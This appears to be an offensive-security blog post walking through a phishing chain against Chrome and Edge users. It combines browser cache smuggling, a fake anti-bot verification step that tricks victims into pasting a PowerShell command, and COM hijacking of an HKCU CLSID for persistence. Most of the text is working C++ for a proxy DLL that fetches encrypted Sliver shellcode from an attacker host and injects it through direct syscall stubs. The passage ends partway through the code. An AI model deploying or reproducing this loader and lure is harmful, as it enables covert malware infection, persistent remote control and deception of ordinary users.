---
title: Initial Access - Beaconing From Browsers
date: 2025-08-23 23:00:00 +0000
toc: true
categories: [windows, initial access]
tags: [initial access, microsoft edge, google chrome, browser cache smuggling, filefix, com hijacking, dll sideloading, c2 ,sliver, shellcode injection, phishing]
media_subpath: /assets/img/beaconing-from-browsers
image: preview.png
description: in todays blog post, i will chain browser cache smuggling, filefix and com-hijacking for initial access and persistence at the same time. the end objective of this chain is to make google chrome and microsoft edge browsers download an encrypted sliver beacon, decrypt and execute it everytime chrome or edge is launched by the victim.
---

## Definition and Overview.

before diving deeper to the implementation, i want first to provide a high level definition of the techniques we'll be using and also show the end results from the victim's prespective.

the attack chain starts when the victim visits a website running under our control, the following will happen:

#### browser cache smuggling
	
as soon as the web page is loaded by the victim's browser, our payload (sliver shellcode injector) is automatically 
downloaded by the browser and stored in the cache folder.

the automatic download is triggered by the browser because this is the default behavior, where static files like images are 
downloaded and stored locally to reduce the loading time when the user visits the webpage again. we will exploit this 
default behavior by simply adding `jpeg` extension to our payload instead of `dll`.

#### filefix
	
a fake anti-bot verification step appears informing the victim that he needs to complete the verification before accessing 
the website. 

the verification process is where we will implement the `filefix` technique. this technique
instructs the victim to open the file selector window and paste a malicious command (copied automatically to the clipboard) 
into the search bar and hit enter. 

the command executed in the file explorer search bar is a powershell script that will try to locate our payload, 
move it to another folder and create new registry keys for the final step in the chain.

#### com-hijacking
	
in this final setp of the chain, we will exploit the search order for com classes. the victim's browser will try to locate some 
com classes under the `hku` registry hive first, if they are not found there, it will search in `hkcr` hive next, once the 
com class is found, the browser will load the `dll` set in the `InProcServer32` subkey that implements the class.

the powershell command executed in the `filefix` step will create a com class identifier (clsid) key under the `hkcu` registry hive 
that chrome and edge search for when launched and then set our payload in `InProcServer32` subkey. now everytime 
the victim launches chrome or edge, our dll will get loaded.

when combining all of the above we get the following

1. the victim visits our website, and the payload is automatically downloaded to the victim borwser's cache folder

	![Desktop View](a.png){: width="1040" height="695" }

2. the victim completes the fake anti-bot verification instructions

	![Desktop View](b.png){: width="1280" height="733" }
	![Desktop View](k.png){: width="1241" height="720" }
3. after the victim hits enter, the payload will be moved from the browser's cache folder to a new folder and a new com clsid is created under `hkcu` hive

	![Desktop View](c.png){: width="826" height="460" }
	![Desktop View](d.png){: width="948" height="697" }

4. now everything is set up, next time the victim launches chrome or edge our sliver beacon will phone home
	
	![Desktop View](e.png){: width="1068" height="752" }
	![Desktop View](l.png){: width="1391" height="676" }

## Implementation.
#### 1. com hijacking - loading our dll
our end objective is to make google chrome and microsoft edge browsers load our dll everytime the victim launches one of them.
		
for this, we will abuse the search order for com classes. if i launch google chrome on my machine we will see that it fails to
open several regsitry keys under `hku\S-1-5-21-2065506456-1301092625-2506-144606-1003\classes\CLSID\` because they don't exist as we can see below

![Desktop View](1.png){: width="1428" height="645" }

checking this registry path, we can see that it does not exist

![Desktop View](2.png){: width="806" height="373" }

chrome now will search under `hkcr` hive, where the registry key will be found

![Desktop View](3.png){: width="1182" height="500" }

finally chrome will load `msctf.dll` set in the `InProcServer32` key that implements the class that chrome needs to use

![Desktop View](4.png){: width="961" height="151" }

we will exploit this search order by creating this class identifier `{33C53A50-F456-4884-B049-85FD643ECFED}` under 
`hkcu\software\classes\CLSID\` and create `InProcServer32` key that points to our `dll`. this will make chrome and any other 
client program who needs to use this com class to load our `dll`.

let's start by creating the `dll` first, we will create a dll that ones loaded by chrome or edge, it will download an encrypted sliver shellcode, decrypt and inject it.

to ensure chrome will still work fine after loading our dll, we must `export` and `proxy` function calls to the original dll where the actual
functionality required by chrome exists , otherwise chrome will crash after loading our dll.

as we saw above, the `dll` set in `InProcServer32` is `msctf.dll`, so this the dll we need to proxy to.

the <a href="https://github.com/mrexodia/perfect-dll-proxy">perfect-dll-proxy</a> script will generate a c++ source code that exports all the functions in `msctf.dll` and forward them to
msctf.dll and all we have to do, is add the shellcode injection functionality.

let's start by generating the dll proxy by running perfect-dll-proxy and passing `msctf.dll` to it

```shell
(python-env) deb@debian:~/Desktop/blog/InitialAccess/post/code$ python3 perfect-dll-proxy.py --help
usage: perfect-dll-proxy.py [-h] [--output OUTPUT] [--force-ordinals] dll

Generate a proxy DLL

positional arguments:
  dll                   Path to the DLL to generate a proxy for

options:
  -h, --help            show this help message and exit
  --output OUTPUT, -o OUTPUT
                        Generated C++ proxy file to write to
  --force-ordinals, -v  Force matching ordinals
(python-env) deb@debian:~/Desktop/blog/InitialAccess/post/code$ python3 perfect-dll-proxy.py msctf.dll --output loader.cpp
(python-env) deb@debian:~/Desktop/blog/InitialAccess/post/code$
```
{: .nolineno }
we will get the following dll proxy

```c++
#include <Windows.h>

#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\msctf.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\msctf.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:CtfImeAssociateFocus=" DLLPATH ".CtfImeAssociateFocus")
#pragma comment(linker, "/EXPORT:CtfImeConfigure=" DLLPATH ".CtfImeConfigure")
#pragma comment(linker, "/EXPORT:CtfImeConversionList=" DLLPATH ".CtfImeConversionList")
#pragma comment(linker, "/EXPORT:CtfImeCreateInputContext=" DLLPATH ".CtfImeCreateInputContext")
#pragma comment(linker, "/EXPORT:CtfImeCreateThreadMgr=" DLLPATH ".CtfImeCreateThreadMgr")
#pragma comment(linker, "/EXPORT:CtfImeDestroy=" DLLPATH ".CtfImeDestroy")
#pragma comment(linker, "/EXPORT:CtfImeDestroyInputContext=" DLLPATH ".CtfImeDestroyInputContext")
#pragma comment(linker, "/EXPORT:CtfImeDestroyThreadMgr=" DLLPATH ".CtfImeDestroyThreadMgr")
#pragma comment(linker, "/EXPORT:CtfImeDispatchDefImeMessage=" DLLPATH ".CtfImeDispatchDefImeMessage")
#pragma comment(linker, "/EXPORT:CtfImeEnumRegisterWord=" DLLPATH ".CtfImeEnumRegisterWord")
#pragma comment(linker, "/EXPORT:CtfImeEscape=" DLLPATH ".CtfImeEscape")
#pragma comment(linker, "/EXPORT:CtfImeEscapeEx=" DLLPATH ".CtfImeEscapeEx")
#pragma comment(linker, "/EXPORT:CtfImeGetGuidAtom=" DLLPATH ".CtfImeGetGuidAtom")
#pragma comment(linker, "/EXPORT:CtfImeGetRegisterWordStyle=" DLLPATH ".CtfImeGetRegisterWordStyle")
#pragma comment(linker, "/EXPORT:CtfImeInquire=" DLLPATH ".CtfImeInquire")
#pragma comment(linker, "/EXPORT:CtfImeInquireExW=" DLLPATH ".CtfImeInquireExW")
#pragma comment(linker, "/EXPORT:CtfImeIsGuidMapEnable=" DLLPATH ".CtfImeIsGuidMapEnable")
#pragma comment(linker, "/EXPORT:CtfImeIsIME=" DLLPATH ".CtfImeIsIME")
#pragma comment(linker, "/EXPORT:CtfImeProcessCicHotkey=" DLLPATH ".CtfImeProcessCicHotkey")
#pragma comment(linker, "/EXPORT:CtfImeProcessKey=" DLLPATH ".CtfImeProcessKey")
#pragma comment(linker, "/EXPORT:CtfImeRegisterWord=" DLLPATH ".CtfImeRegisterWord")
#pragma comment(linker, "/EXPORT:CtfImeSelect=" DLLPATH ".CtfImeSelect")
#pragma comment(linker, "/EXPORT:CtfImeSelectEx=" DLLPATH ".CtfImeSelectEx")
#pragma comment(linker, "/EXPORT:CtfImeSetActiveContext=" DLLPATH ".CtfImeSetActiveContext")
#pragma comment(linker, "/EXPORT:CtfImeSetCompositionString=" DLLPATH ".CtfImeSetCompositionString")
#pragma comment(linker, "/EXPORT:CtfImeSetFocus=" DLLPATH ".CtfImeSetFocus")
#pragma comment(linker, "/EXPORT:CtfImeToAsciiEx=" DLLPATH ".CtfImeToAsciiEx")
#pragma comment(linker, "/EXPORT:CtfImeUnregisterWord=" DLLPATH ".CtfImeUnregisterWord")
#pragma comment(linker, "/EXPORT:CtfNotifyIME=" DLLPATH ".CtfNotifyIME")
#pragma comment(linker, "/EXPORT:DllCanUnloadNow=" DLLPATH ".DllCanUnloadNow,PRIVATE")
#pragma comment(linker, "/EXPORT:DllGetClassObject=" DLLPATH ".DllGetClassObject,PRIVATE")
#pragma comment(linker, "/EXPORT:DllRegisterServer=" DLLPATH ".DllRegisterServer,PRIVATE")
#pragma comment(linker, "/EXPORT:DllUnregisterServer=" DLLPATH ".DllUnregisterServer,PRIVATE")
#pragma comment(linker, "/EXPORT:HasDeferredInputForCoreDispatcher=" DLLPATH ".HasDeferredInputForCoreDispatcher")
#pragma comment(linker, "/EXPORT:InputFocusMonitorCreate=" DLLPATH ".InputFocusMonitorCreate")
#pragma comment(linker, "/EXPORT:SetInputScope=" DLLPATH ".SetInputScope")
#pragma comment(linker, "/EXPORT:SetInputScopeXML=" DLLPATH ".SetInputScopeXML")
#pragma comment(linker, "/EXPORT:SetInputScopes=" DLLPATH ".SetInputScopes")
#pragma comment(linker, "/EXPORT:SetInputScopes2=" DLLPATH ".SetInputScopes2")
#pragma comment(linker, "/EXPORT:TF_CUASAppFix=" DLLPATH ".TF_CUASAppFix")
#pragma comment(linker, "/EXPORT:TF_CanUninitialize=" DLLPATH ".TF_CanUninitialize")
#pragma comment(linker, "/EXPORT:TF_CleanUpPrivateMessages=" DLLPATH ".TF_CleanUpPrivateMessages")
#pragma comment(linker, "/EXPORT:TF_CreateCTFWatchdogMutex=" DLLPATH ".TF_CreateCTFWatchdogMutex")
#pragma comment(linker, "/EXPORT:TF_CreateCategoryMgr=" DLLPATH ".TF_CreateCategoryMgr")
#pragma comment(linker, "/EXPORT:TF_CreateCicLoadMutex=" DLLPATH ".TF_CreateCicLoadMutex")
#pragma comment(linker, "/EXPORT:TF_CreateCicLoadWinStaMutex=" DLLPATH ".TF_CreateCicLoadWinStaMutex")
#pragma comment(linker, "/EXPORT:TF_CreateDisplayAttributeMgr=" DLLPATH ".TF_CreateDisplayAttributeMgr")
#pragma comment(linker, "/EXPORT:TF_CreateInputProcessorProfiles=" DLLPATH ".TF_CreateInputProcessorProfiles")
#pragma comment(linker, "/EXPORT:TF_CreateLangBarItemMgr=" DLLPATH ".TF_CreateLangBarItemMgr")
#pragma comment(linker, "/EXPORT:TF_CreateLangBarMgr=" DLLPATH ".TF_CreateLangBarMgr")
#pragma comment(linker, "/EXPORT:TF_CreateThreadMgr=" DLLPATH ".TF_CreateThreadMgr")
#pragma comment(linker, "/EXPORT:TF_GetAppCompatFlags=" DLLPATH ".TF_GetAppCompatFlags")
#pragma comment(linker, "/EXPORT:TF_GetCompatibleKeyboardLayout=" DLLPATH ".TF_GetCompatibleKeyboardLayout")
#pragma comment(linker, "/EXPORT:TF_GetGlobalCompartment=" DLLPATH ".TF_GetGlobalCompartment")
#pragma comment(linker, "/EXPORT:TF_GetInitSystemFlags=" DLLPATH ".TF_GetInitSystemFlags")
#pragma comment(linker, "/EXPORT:TF_GetInputScope=" DLLPATH ".TF_GetInputScope")
#pragma comment(linker, "/EXPORT:TF_GetShowFloatingStatus=" DLLPATH ".TF_GetShowFloatingStatus")
#pragma comment(linker, "/EXPORT:TF_GetThreadFlags=" DLLPATH ".TF_GetThreadFlags")
#pragma comment(linker, "/EXPORT:TF_GetThreadMgr=" DLLPATH ".TF_GetThreadMgr")
#pragma comment(linker, "/EXPORT:TF_InitSystem=" DLLPATH ".TF_InitSystem")
#pragma comment(linker, "/EXPORT:TF_InvalidAssemblyListCacheIfExist=" DLLPATH ".TF_InvalidAssemblyListCacheIfExist")
#pragma comment(linker, "/EXPORT:TF_IsCtfmonRunning=" DLLPATH ".TF_IsCtfmonRunning")
#pragma comment(linker, "/EXPORT:TF_IsLanguageBarEnabled=" DLLPATH ".TF_IsLanguageBarEnabled")
#pragma comment(linker, "/EXPORT:TF_IsThreadWithFlags=" DLLPATH ".TF_IsThreadWithFlags")
#pragma comment(linker, "/EXPORT:TF_MapCompatibleHKL=" DLLPATH ".TF_MapCompatibleHKL")
#pragma comment(linker, "/EXPORT:TF_MapCompatibleKeyboardTip=" DLLPATH ".TF_MapCompatibleKeyboardTip")
#pragma comment(linker, "/EXPORT:TF_Notify=" DLLPATH ".TF_Notify")
#pragma comment(linker, "/EXPORT:TF_PostAllThreadMsg=" DLLPATH ".TF_PostAllThreadMsg")
#pragma comment(linker, "/EXPORT:TF_RunInputCPL=" DLLPATH ".TF_RunInputCPL")
#pragma comment(linker, "/EXPORT:TF_SendLangBandMsg=" DLLPATH ".TF_SendLangBandMsg")
#pragma comment(linker, "/EXPORT:TF_SetDefaultRemoteKeyboardLayout=" DLLPATH ".TF_SetDefaultRemoteKeyboardLayout")
#pragma comment(linker, "/EXPORT:TF_SetShowFloatingStatus=" DLLPATH ".TF_SetShowFloatingStatus")
#pragma comment(linker, "/EXPORT:TF_SetThreadFlags=" DLLPATH ".TF_SetThreadFlags")
#pragma comment(linker, "/EXPORT:TF_UninitSystem=" DLLPATH ".TF_UninitSystem")
#pragma comment(linker, "/EXPORT:TF_WaitForInitialized=" DLLPATH ".TF_WaitForInitialized")
#pragma comment(linker, "/EXPORT:TextInputClientWrapperCreate=" DLLPATH ".TextInputClientWrapperCreate")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
now we need to add our own code that downloads, decrypt and injects sliver shellcode.here is the full version of the 
dll after adding our code, all you need to change is the ip address and the xor key

```c++
#include <iostream>
#include "windows.h"
#include "winternl.h"
#include <vector>
#include <string>
#include <fstream>
#include <wininet.h>


#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\msctf.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\msctf.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:CtfImeAssociateFocus=" DLLPATH ".CtfImeAssociateFocus")
#pragma comment(linker, "/EXPORT:CtfImeConfigure=" DLLPATH ".CtfImeConfigure")
#pragma comment(linker, "/EXPORT:CtfImeConversionList=" DLLPATH ".CtfImeConversionList")
#pragma comment(linker, "/EXPORT:CtfImeCreateInputContext=" DLLPATH ".CtfImeCreateInputContext")
#pragma comment(linker, "/EXPORT:CtfImeCreateThreadMgr=" DLLPATH ".CtfImeCreateThreadMgr")
#pragma comment(linker, "/EXPORT:CtfImeDestroy=" DLLPATH ".CtfImeDestroy")
#pragma comment(linker, "/EXPORT:CtfImeDestroyInputContext=" DLLPATH ".CtfImeDestroyInputContext")
#pragma comment(linker, "/EXPORT:CtfImeDestroyThreadMgr=" DLLPATH ".CtfImeDestroyThreadMgr")
#pragma comment(linker, "/EXPORT:CtfImeDispatchDefImeMessage=" DLLPATH ".CtfImeDispatchDefImeMessage")
#pragma comment(linker, "/EXPORT:CtfImeEnumRegisterWord=" DLLPATH ".CtfImeEnumRegisterWord")
#pragma comment(linker, "/EXPORT:CtfImeEscape=" DLLPATH ".CtfImeEscape")
#pragma comment(linker, "/EXPORT:CtfImeEscapeEx=" DLLPATH ".CtfImeEscapeEx")
#pragma comment(linker, "/EXPORT:CtfImeGetGuidAtom=" DLLPATH ".CtfImeGetGuidAtom")
#pragma comment(linker, "/EXPORT:CtfImeGetRegisterWordStyle=" DLLPATH ".CtfImeGetRegisterWordStyle")
#pragma comment(linker, "/EXPORT:CtfImeInquire=" DLLPATH ".CtfImeInquire")
#pragma comment(linker, "/EXPORT:CtfImeInquireExW=" DLLPATH ".CtfImeInquireExW")
#pragma comment(linker, "/EXPORT:CtfImeIsGuidMapEnable=" DLLPATH ".CtfImeIsGuidMapEnable")
#pragma comment(linker, "/EXPORT:CtfImeIsIME=" DLLPATH ".CtfImeIsIME")
#pragma comment(linker, "/EXPORT:CtfImeProcessCicHotkey=" DLLPATH ".CtfImeProcessCicHotkey")
#pragma comment(linker, "/EXPORT:CtfImeProcessKey=" DLLPATH ".CtfImeProcessKey")
#pragma comment(linker, "/EXPORT:CtfImeRegisterWord=" DLLPATH ".CtfImeRegisterWord")
#pragma comment(linker, "/EXPORT:CtfImeSelect=" DLLPATH ".CtfImeSelect")
#pragma comment(linker, "/EXPORT:CtfImeSelectEx=" DLLPATH ".CtfImeSelectEx")
#pragma comment(linker, "/EXPORT:CtfImeSetActiveContext=" DLLPATH ".CtfImeSetActiveContext")
#pragma comment(linker, "/EXPORT:CtfImeSetCompositionString=" DLLPATH ".CtfImeSetCompositionString")
#pragma comment(linker, "/EXPORT:CtfImeSetFocus=" DLLPATH ".CtfImeSetFocus")
#pragma comment(linker, "/EXPORT:CtfImeToAsciiEx=" DLLPATH ".CtfImeToAsciiEx")
#pragma comment(linker, "/EXPORT:CtfImeUnregisterWord=" DLLPATH ".CtfImeUnregisterWord")
#pragma comment(linker, "/EXPORT:CtfNotifyIME=" DLLPATH ".CtfNotifyIME")
#pragma comment(linker, "/EXPORT:DllCanUnloadNow=" DLLPATH ".DllCanUnloadNow,PRIVATE")
#pragma comment(linker, "/EXPORT:DllGetClassObject=" DLLPATH ".DllGetClassObject,PRIVATE")
#pragma comment(linker, "/EXPORT:DllRegisterServer=" DLLPATH ".DllRegisterServer,PRIVATE")
#pragma comment(linker, "/EXPORT:DllUnregisterServer=" DLLPATH ".DllUnregisterServer,PRIVATE")
#pragma comment(linker, "/EXPORT:HasDeferredInputForCoreDispatcher=" DLLPATH ".HasDeferredInputForCoreDispatcher")
#pragma comment(linker, "/EXPORT:InputFocusMonitorCreate=" DLLPATH ".InputFocusMonitorCreate")
#pragma comment(linker, "/EXPORT:SetInputScope=" DLLPATH ".SetInputScope")
#pragma comment(linker, "/EXPORT:SetInputScopeXML=" DLLPATH ".SetInputScopeXML")
#pragma comment(linker, "/EXPORT:SetInputScopes=" DLLPATH ".SetInputScopes")
#pragma comment(linker, "/EXPORT:SetInputScopes2=" DLLPATH ".SetInputScopes2")
#pragma comment(linker, "/EXPORT:TF_CUASAppFix=" DLLPATH ".TF_CUASAppFix")
#pragma comment(linker, "/EXPORT:TF_CanUninitialize=" DLLPATH ".TF_CanUninitialize")
#pragma comment(linker, "/EXPORT:TF_CleanUpPrivateMessages=" DLLPATH ".TF_CleanUpPrivateMessages")
#pragma comment(linker, "/EXPORT:TF_CreateCTFWatchdogMutex=" DLLPATH ".TF_CreateCTFWatchdogMutex")
#pragma comment(linker, "/EXPORT:TF_CreateCategoryMgr=" DLLPATH ".TF_CreateCategoryMgr")
#pragma comment(linker, "/EXPORT:TF_CreateCicLoadMutex=" DLLPATH ".TF_CreateCicLoadMutex")
#pragma comment(linker, "/EXPORT:TF_CreateCicLoadWinStaMutex=" DLLPATH ".TF_CreateCicLoadWinStaMutex")
#pragma comment(linker, "/EXPORT:TF_CreateDisplayAttributeMgr=" DLLPATH ".TF_CreateDisplayAttributeMgr")
#pragma comment(linker, "/EXPORT:TF_CreateInputProcessorProfiles=" DLLPATH ".TF_CreateInputProcessorProfiles")
#pragma comment(linker, "/EXPORT:TF_CreateLangBarItemMgr=" DLLPATH ".TF_CreateLangBarItemMgr")
#pragma comment(linker, "/EXPORT:TF_CreateLangBarMgr=" DLLPATH ".TF_CreateLangBarMgr")
#pragma comment(linker, "/EXPORT:TF_CreateThreadMgr=" DLLPATH ".TF_CreateThreadMgr")
#pragma comment(linker, "/EXPORT:TF_GetAppCompatFlags=" DLLPATH ".TF_GetAppCompatFlags")
#pragma comment(linker, "/EXPORT:TF_GetCompatibleKeyboardLayout=" DLLPATH ".TF_GetCompatibleKeyboardLayout")
#pragma comment(linker, "/EXPORT:TF_GetGlobalCompartment=" DLLPATH ".TF_GetGlobalCompartment")
#pragma comment(linker, "/EXPORT:TF_GetInitSystemFlags=" DLLPATH ".TF_GetInitSystemFlags")
#pragma comment(linker, "/EXPORT:TF_GetInputScope=" DLLPATH ".TF_GetInputScope")
#pragma comment(linker, "/EXPORT:TF_GetShowFloatingStatus=" DLLPATH ".TF_GetShowFloatingStatus")
#pragma comment(linker, "/EXPORT:TF_GetThreadFlags=" DLLPATH ".TF_GetThreadFlags")
#pragma comment(linker, "/EXPORT:TF_GetThreadMgr=" DLLPATH ".TF_GetThreadMgr")
#pragma comment(linker, "/EXPORT:TF_InitSystem=" DLLPATH ".TF_InitSystem")
#pragma comment(linker, "/EXPORT:TF_InvalidAssemblyListCacheIfExist=" DLLPATH ".TF_InvalidAssemblyListCacheIfExist")
#pragma comment(linker, "/EXPORT:TF_IsCtfmonRunning=" DLLPATH ".TF_IsCtfmonRunning")
#pragma comment(linker, "/EXPORT:TF_IsLanguageBarEnabled=" DLLPATH ".TF_IsLanguageBarEnabled")
#pragma comment(linker, "/EXPORT:TF_IsThreadWithFlags=" DLLPATH ".TF_IsThreadWithFlags")
#pragma comment(linker, "/EXPORT:TF_MapCompatibleHKL=" DLLPATH ".TF_MapCompatibleHKL")
#pragma comment(linker, "/EXPORT:TF_MapCompatibleKeyboardTip=" DLLPATH ".TF_MapCompatibleKeyboardTip")
#pragma comment(linker, "/EXPORT:TF_Notify=" DLLPATH ".TF_Notify")
#pragma comment(linker, "/EXPORT:TF_PostAllThreadMsg=" DLLPATH ".TF_PostAllThreadMsg")
#pragma comment(linker, "/EXPORT:TF_RunInputCPL=" DLLPATH ".TF_RunInputCPL")
#pragma comment(linker, "/EXPORT:TF_SendLangBandMsg=" DLLPATH ".TF_SendLangBandMsg")
#pragma comment(linker, "/EXPORT:TF_SetDefaultRemoteKeyboardLayout=" DLLPATH ".TF_SetDefaultRemoteKeyboardLayout")
#pragma comment(linker, "/EXPORT:TF_SetShowFloatingStatus=" DLLPATH ".TF_SetShowFloatingStatus")
#pragma comment(linker, "/EXPORT:TF_SetThreadFlags=" DLLPATH ".TF_SetThreadFlags")
#pragma comment(linker, "/EXPORT:TF_UninitSystem=" DLLPATH ".TF_UninitSystem")
#pragma comment(linker, "/EXPORT:TF_WaitForInitialized=" DLLPATH ".TF_WaitForInitialized")
#pragma comment(linker, "/EXPORT:TextInputClientWrapperCreate=" DLLPATH ".TextInputClientWrapperCreate")

#pragma comment(lib, "ntdll")
#pragma comment(lib, "wininet.lib")



int const SYSCALL_STUB_SIZE = 23;

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, LPVOID syscallStub)
{
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	LPVOID fileData = NULL;

	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE;

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
		}
	}

	return stubFound;
}

using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, PVOID Buffer, SIZE_T RegionSize, PULONG numBytesWritten);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, LPVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

void iSC(HANDLE pHandle, PVOID sc, size_t sc_size)
{
	myNtAllocateVirutalMemory NtAllocateVirtualMemory;
	myNtWriteVirtualMemory NtWriteVirtualMemory;
	myNtCreateThreadEx NtCreateThreadEx;

	char syscallStub_NtAlloc[SYSCALL_STUB_SIZE] = {};
	char syscallStub_NtWrite[SYSCALL_STUB_SIZE] = {};
	char syscallStub_NtCreate[SYSCALL_STUB_SIZE] = {};
	DWORD oldProtection = 0;

	// define NtAllocateVirtualMemory
	NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub_NtAlloc;
	VirtualProtect(syscallStub_NtAlloc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
	// define NtWriteVirtualMemory
	NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub_NtWrite;
	VirtualProtect(syscallStub_NtWrite, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
	// define NtCreateThreadEx
	NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub_NtCreate;
	VirtualProtect(syscallStub_NtCreate, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// get syscall stubs
	GetSyscallStub("NtAllocateVirtualMemory", syscallStub_NtAlloc);
	GetSyscallStub("NtWriteVirtualMemory", syscallStub_NtWrite);
	GetSyscallStub("NtCreateThreadEx", syscallStub_NtCreate);

	SIZE_T RegionSize = sc_size;
	LPVOID BaseAddr;
	PVOID nn = nullptr;
	HANDLE hThread;

	NtAllocateVirtualMemory(pHandle, &BaseAddr, 0, &RegionSize, (MEM_RESERVE|MEM_COMMIT), PAGE_READWRITE);
	Sleep(10000);
	std::cout << "\n [+] The SC is in: " << BaseAddr << "\n";
	NtWriteVirtualMemory(pHandle, BaseAddr, sc, sc_size, 0);
	VirtualProtectEx(pHandle, BaseAddr, sc_size - 1, PAGE_EXECUTE_READ, &oldProtection);
	Sleep(10000);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, BaseAddr, nn, FALSE, NULL, NULL, NULL, NULL);
	
	WaitForSingleObject(hThread, INFINITE);

}
// Helper to download a file using WinINet
bool DownloadFile(const std::wstring& url, std::vector<BYTE>& outData) {
    HINTERNET hInternet = InternetOpenW(L"rexkyris", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;

    DWORD flags =
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_SECURE|
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    HINTERNET hFile = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, flags, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outData.insert(outData.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}

void XORDecryptEncrypt(std::vector<BYTE>& data, const std::string& key) {
    size_t keyLength = key.size();
    for (size_t i = 0; i < data.size(); ++i) {
        // XOR each byte of the data with the corresponding byte of the key
        data[i] ^= key[i % keyLength];  // Repeat the key if shorter than data
    }
}

void Run(std::wstring url, std::string xorKey)
{
    
    std::vector<BYTE> encryptedData;

    // Download the encrypted file
    if (!DownloadFile(url, encryptedData)) {
        std::cerr << "Failed to download encrypted file." << std::endl;
        exit(1);
    }
  
    // XOR decrypt the downloaded data
    XORDecryptEncrypt(encryptedData, xorKey);
    
    // After XOR decryption, we now have the original data
    std::cout << "Decryption successful. Decrypted data size: " << encryptedData.size() << " bytes." << std::endl;
    
    // inject to our process
    HANDLE pHandle = GetCurrentProcess();
    iSC(pHandle, encryptedData.data(), encryptedData.size());
}
BOOL IsPayloadRunning()
{
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("////EVENT-48374635899"));
	if(hEvent != NULL)
	{
		if(GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return FALSE;
